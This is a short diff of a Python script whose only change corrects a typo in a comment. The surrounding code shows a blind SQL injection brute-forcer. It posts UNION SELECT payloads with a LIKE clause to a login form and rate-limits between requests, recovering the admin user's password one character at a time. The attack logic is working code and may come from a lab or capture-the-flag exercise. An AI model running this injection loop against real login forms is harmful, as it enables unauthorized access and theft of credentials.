@@ -26,7 +26,7 @@ while True:
 			break
 		# introduce some slight rate-limiting; adjust as needed
 		time.sleep(0.5)
-		# the query to use to enumerate each in the password for the admin user
+		# the query to use to enumerate each char in the password for the admin user
 		query = "' UNION SELECT * from users where user='admin' and pass LIKE '" + password + i + "%" + "'-- "
 		try:
 			r = requests.post(url, data={"username":query, "password":query})
